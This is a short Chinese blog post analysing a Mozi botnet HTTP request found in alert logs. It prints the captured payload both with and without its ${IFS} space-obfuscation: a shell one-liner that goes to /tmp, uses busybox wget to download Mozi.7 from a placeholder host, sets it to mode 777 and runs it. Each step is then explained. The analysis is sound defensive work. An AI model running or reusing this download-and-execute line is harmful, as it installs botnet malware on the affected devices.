ailx10说：这篇是在2023年12月之前写的，后来又改过。听过 Mozi 的旧新闻后，很久没再见它，告警巡检里突然又冒出相关名字，就让我多停了一下。请求用 IFS 把命令里的空格替掉，下载、赋权、执行挤在一条线上，读起来不像平时敲的 shell。我先把这些写法拆回正常顺序，看看它到底想做什么，可二进制没拿到，也没有看到攻击成功。于是这篇就停在日志分析这一层。它是一次和旧名字的偶遇，不是完整的样本报告，也保留了日常分析里线索有时就到此为止的样子。

---

简单分析如下，HTTP请求内容包含如下内容：

```
/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7' 
```

IFS 是 shell 的字段分隔符。未经引用的变量展开在特定 shell 条件下通常可产生分隔效果，不能笼统解释为阻止参数分隔。

```
/bin/sh -c 'cd /tmp; rm -rf Mozi.7; busybox wget http://%s:%d/Mozi.7; chmod 777 Mozi.7; ./Mozi.7'
```

再来逐段翻译翻译就是：

- `/bin/sh -c` 启动一个 shell 。它将执行以下操作：
- `cd /tmp`: 切换到 /tmp 目录。
- `rm -rf Mozi.7`: 递归地删除名为 Mozi.7 的文件。
- `busybox wget http://%s:%d/Mozi.7`: 使用 busybox wget 命令下载一个文件
- `chmod 777 Mozi.7`: 给 Mozi.7 文件设置可执行权限。
- `./Mozi.7`: 执行 Mozi.7 文件。
